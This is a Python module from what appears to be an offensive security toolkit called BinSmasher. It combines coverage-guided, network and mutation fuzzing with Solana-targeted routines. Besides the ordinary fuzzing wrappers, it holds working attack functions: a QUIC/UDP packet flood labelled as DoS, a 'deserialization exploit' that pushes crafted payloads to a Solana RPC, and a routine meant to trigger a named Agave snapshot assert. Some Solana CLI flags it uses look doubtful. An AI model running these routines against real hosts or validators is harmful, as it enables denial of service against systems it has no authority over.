#!/usr/bin/env python3
"""
BinSmasher – fuzzer.py
AFL++, boofuzz, mutation, BPF, QUIC/DoS fuzzing.
"""

import os
import time
import random
import socket
import struct
import logging
import subprocess
import threading
from pathlib import Path

from rich.console import Console
from rich.panel import Panel

console = Console()
log = logging.getLogger("binsmasher")


class Fuzzer:
    """All fuzzing operations."""

    def __init__(self, binary: str, host: str, port: int,
                 log_file: str, platform: str) -> None:
        self.binary   = binary
        self.host     = host
        self.port     = port
        self.log_file = log_file
        self.platform = platform

    # ────────────────────────────────────────────
    # 1. AFL++ coverage-guided
    # ────────────────────────────────────────────

    def afl_fuzz(self, binary_args: list, timeout_sec: int = 30) -> bool:
        log.info("Starting AFL++ coverage-guided fuzzing…")
        afl_in  = Path("afl_in")
        afl_out = Path("afl_out")
        afl_in.mkdir(exist_ok=True)
        afl_out.mkdir(exist_ok=True)

        seeds = [
            b"A" * 64, b"\x00" * 64, b"\xff" * 64,
            b"GET / HTTP/1.1\r\n\r\n", os.urandom(64),
            b"%p" * 16, b"\x41" * 256,
        ]
        for i, seed in enumerate(seeds):
            (afl_in / f"seed_{i:02d}").write_bytes(seed)

        cmd_parts = [self.binary] + binary_args
        afl_cmd = (
            f"AFL_SKIP_CPUFREQ=1 AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES=1 "
            f"afl-fuzz -i {afl_in} -o {afl_out} -t 2000 "
            f"-- {' '.join(cmd_parts)} @@"
        )
        try:
            proc = subprocess.Popen(
                afl_cmd, shell=True,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            deadline = time.time() + timeout_sec
            while time.time() < deadline:
                time.sleep(2)
                crash_dir = afl_out / "default" / "crashes"
                if crash_dir.exists():
                    crashes = list(crash_dir.glob("id:*"))
                    if crashes:
                        log.info(f"AFL++: {len(crashes)} crash(es) found!")
                        for c in crashes[:5]:
                            log.debug(f"  {c.name}")
            proc.terminate()
            proc.wait(timeout=5)
            log.info(f"AFL++ done — check {afl_out}/default/crashes")
            return True
        except FileNotFoundError:
            log.error("afl-fuzz not found — install: apt install afl++")
            return False
        except Exception as e:
            log.error(f"AFL++ error: {e}")
            return False

    # ────────────────────────────────────────────
    # 2. boofuzz network fuzzing
    # ────────────────────────────────────────────

    def fuzz_target(self, file_input: str | None, protocol: str,
                    binary_args: list) -> bool:
        log.info(f"Boofuzz ({protocol}) @ {self.host}:{self.port}…")
        try:
            from boofuzz import (Session, Target, TCPSocketConnection,  # type: ignore
                                  s_initialize, s_static, s_string, s_get)
        except ImportError:
            log.error("boofuzz not installed: pip install boofuzz")
            return False

        srv_proc = None
        if os.path.isfile(self.binary):
            try:
                srv_proc = subprocess.Popen(
                    [self.binary] + binary_args,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                time.sleep(1.5)
            except Exception as e:
                log.warning(f"Could not start server: {e}")

        try:
            conn    = TCPSocketConnection(self.host, self.port, timeout=5)
            session = Session(
                target=Target(connection=conn),
                sleep_time=0.05,
                crash_threshold_request=3,
                crash_threshold_element=3,
            )

            if file_input == "mp3":
                s_initialize("mp3")
                s_static(b"\xFF\xFB")
                s_string(b"ID3", fuzzable=False)
                s_string(b"\x03\x00\x00\x00\x00\x00", fuzzable=True, name="hdr")
                s_string(b"A" * 512, fuzzable=True, name="body")
            elif protocol == "http":
                s_initialize("http")
                s_static(b"GET /")
                s_string(b"index.html", fuzzable=True, name="path")
                s_static(b" HTTP/1.1\r\nHost: ")
                s_string(b"localhost", fuzzable=True, name="host")
                s_static(b"\r\n\r\n")
                s_string(b"", fuzzable=True, name="body")
            else:
                s_initialize("raw")
                s_string(b"A" * 128, fuzzable=True, name="payload")

            name = "mp3" if file_input == "mp3" else ("http" if protocol == "http" else "raw")
            session.connect(s_get(name))
            session.fuzz(max_depth=500)
            log.info("Boofuzz completed — check boofuzz-results/ for crashes")
            return True
        except Exception as e:
            log.error(f"Boofuzz error: {e}")
            return False
        finally:
            if srv_proc:
                srv_proc.terminate()

    # ────────────────────────────────────────────
    # 3. Built-in mutation fuzzer
    # ────────────────────────────────────────────

    def mutation_fuzz(self, num_cases: int = 500, timeout: float = 1.0) -> bool:
        """Bit-flip / byte insert / known-bad integer mutation fuzzer."""
        log.info(f"Mutation fuzzing {self.host}:{self.port} ({num_cases} cases)…")
        crashes = 0
        seeds = [
            b"A" * 128, b"\x00" * 128, b"\xff" * 128,
            b"%s" * 32, b"%n" * 32, b"A" * 4096,
            b"\x7f" * 64, b"\x80" * 64,
        ]

        def mutate(data: bytes) -> bytes:
            data = bytearray(data)
            op = random.randint(0, 5)
            if op == 0 and data:
                i = random.randint(0, len(data) - 1)
                data[i] ^= 1 << random.randint(0, 7)
            elif op == 1:
                pos = random.randint(0, len(data))
                data[pos:pos] = os.urandom(random.randint(1, 16))
            elif op == 2 and data:
                s = random.randint(0, len(data) - 1)
                l = random.randint(1, min(32, len(data) - s))
                data[s:s + l] = bytes([random.randint(0, 255)] * l)
            elif op == 3:
                data += b"\x00" * random.randint(1, 64)
            elif op == 4:
                ints = [b"\xff\xff\xff\xff", b"\x00\x00\x00\x00",
                        b"\x80\x00\x00\x00", b"\x7f\xff\xff\xff"]
                pos   = random.randint(0, len(data))
                chunk = random.choice(ints)
                data[pos:pos + len(chunk)] = chunk[:len(data) - pos]
            else:
                data = data * random.randint(2, 8)   # repeat / expand
            return bytes(data)

        for i in range(num_cases):
            payload = mutate(random.choice(seeds))
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((self.host, self.port))
                s.sendall(payload)
                try:
                    resp = s.recv(4096)
                except Exception:
                    resp = b""
                s.close()
                if not resp:
                    crashes += 1
                    Path(f"crash_{i:04d}.bin").write_bytes(payload)
                    log.warning(f"Potential crash #{crashes} — case {i}")
            except ConnectionRefusedError:
                time.sleep(0.3)
            except Exception:
                pass

        log.info(f"Mutation fuzzing done: {crashes} potential crash(es)")
        return crashes > 0

    # ────────────────────────────────────────────
    # 4. Solana / BPF fuzzer
    # ────────────────────────────────────────────

    def fuzz_bpf(self, rpc_url: str, num_attempts: int = 10) -> bool:
        log.info(f"BPF/SVM fuzzing via {rpc_url}…")
        success = 0
        for i in range(num_attempts):
            elf_header = (
                b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * 9
                + struct.pack("<H", 0x0002)
                + struct.pack("<H", 0x00f7)
                + struct.pack("<I", 1)
                + os.urandom(8 * 5)
            )
            payload = elf_header + os.urandom(random.randint(64, 512))
            path    = f"fuzz_bpf_{i:03d}.so"
            Path(path).write_bytes(payload)
            cmd = f"solana program deploy --url {rpc_url} {path} 2>&1"
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10
                                              ).decode(errors="ignore")
                log.debug(f"  BPF {i}: {out[:120]}")
                if "panic" in out.lower() or "error" in out.lower():
                    log.warning(f"  Interesting at attempt {i}")
                success += 1
            except FileNotFoundError:
                log.error("solana CLI not installed")
                return False
            except Exception as e:
                log.debug(f"  BPF {i}: {e}")
        log.info(f"BPF fuzzing done: {success}/{num_attempts}")
        return True

    # ────────────────────────────────────────────
    # 5. Deserialization exploit
    # ────────────────────────────────────────────

    def exploit_deser(self, rpc_url: str) -> bool:
        import base64
        log.info("Solana deserialization exploit…")
        payloads = [
            os.urandom(200),
            b"\xff" * 200,
            b"\x00" * 200,
            struct.pack("<QQQ", 0xDEADBEEF, 0xCAFEBABE, 0xBAADF00D) * 8,
        ]
        for i, raw in enumerate(payloads):
            b64 = base64.b64encode(raw).decode()
            cmd = (
                f"solana transfer --url {rpc_url} "
                f"--from /dev/stdin 11111111111111111111111111111112 0.000001 "
                f"--tx-data {b64} --allow-unfunded-recipient 2>&1 || true"
            )
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10
                                              ).decode(errors="ignore")
                log.debug(f"Deser {i}: {out[:160]}")
                if "panic" in out.lower():
                    log.warning(f"Panic on deser payload {i}")
            except Exception as e:
                log.debug(f"Deser {i}: {e}")
        return True

    # ────────────────────────────────────────────
    # 6. QUIC / UDP flood DoS
    # ────────────────────────────────────────────

    def dos_quic(self, num_packets: int = 2000) -> bool:
        log.info(f"QUIC DoS → {self.host}:{self.port} ({num_packets} pkts)…")
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            addr = (self.host, self.port)
            for _ in range(num_packets):
                pkt = bytearray()
                pkt.append(0xC0 | random.randint(0, 3))
                pkt += struct.pack(">I", 1)
                pkt.append(8)
                pkt += os.urandom(8)
                pkt.append(0)
                pkt += os.urandom(random.randint(16, 1200))
                sock.sendto(bytes(pkt), addr)
                sent += 1
            sock.close()
            log.info(f"QUIC DoS: {sent} packets sent")
            return True
        except Exception as e:
            log.error(f"QUIC DoS: {e}")
            return False

    # ────────────────────────────────────────────
    # 7. Snapshot assert (Agave #6295)
    # ────────────────────────────────────────────

    def exploit_snapshot_assert(self, rpc_url: str) -> bool:
        log.info("Snapshot assert trigger (Agave #6295)…")
        for slot in (0, 1, 10, 2**32 - 1, 2**64 - 1):
            cmd = f"solana snapshot --url {rpc_url} --slot {slot} 2>&1 || true"
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10
                                              ).decode(errors="ignore")
                log.debug(f"  slot={slot}: {out[:160]}")
                if "assert" in out.lower() or "panic" in out.lower():
                    log.warning(f"  Assert/panic at slot={slot}!")
            except Exception as e:
                log.debug(f"  slot={slot}: {e}")
        return True
